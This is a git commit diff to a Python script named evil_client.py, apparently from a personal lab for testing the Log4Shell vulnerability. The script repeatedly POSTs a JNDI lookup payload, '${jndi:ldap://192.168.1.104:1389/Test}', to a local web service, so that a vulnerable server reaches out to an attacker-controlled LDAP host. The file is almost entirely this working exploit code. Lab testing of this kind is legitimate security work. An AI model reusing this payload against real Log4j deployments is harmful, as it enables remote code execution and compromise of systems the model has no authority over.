a4a58ec2145e6ce505ccd02f604c208120ea8a2a
Martin Bäumer <martin.baeumer@gmail.com>
2022-02-20 02:03:22 +0100

    renamed file; changed so that HTTP status is shown

--- client/evil_client.py
+++ client/evil_client.py
@@ -3,13 +3,12 @@
 import requests
 
 def make_post_call():
-  for i in range(1000):
+  for i in range(100):
     #pload = 'hello'
-    #openssl s_client -connect 192.168.1.104:1389
     pload = '${jndi:ldap://192.168.1.104:1389/Test}'
     #pload = '${jndi:ldap://localhost:1389/Test}'
     r = requests.post('http://localhost:8080/post',data = pload)
-    print("Sent request")
+    print("Sent request, received %d " % (r.status_code))
 
 
 if __name__ == '__main__':
